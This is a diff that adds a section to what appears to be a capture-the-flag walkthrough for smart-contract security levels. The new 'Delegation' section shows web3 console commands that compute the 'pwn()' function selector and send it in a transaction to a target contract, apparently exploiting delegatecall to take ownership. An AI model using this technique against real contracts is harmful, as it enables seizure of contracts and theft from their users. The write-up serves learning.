@@ -134,6 +134,18 @@ Submit the instance
 ٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!
 ```
 
+## 6. Delegation
+```
+> await web3.eth.abi.encodeFunctionSignature("pwn()")
+< '0xdd365b8b'
+
+> await web3.eth.sendTransaction({from:"0x76F2CCD13DB4D70DFB2114704BD9d4d6326bafA0",
+ data:"0xdd365b8b", to:"0xD59491bF35887E4A36Fb197EB5739A02f03d4516"})
+ 
+```
+Submit instance 
+``` ✌(◕‿-)✌ Well done, You have completed this level!!! ```
+
 
 
 
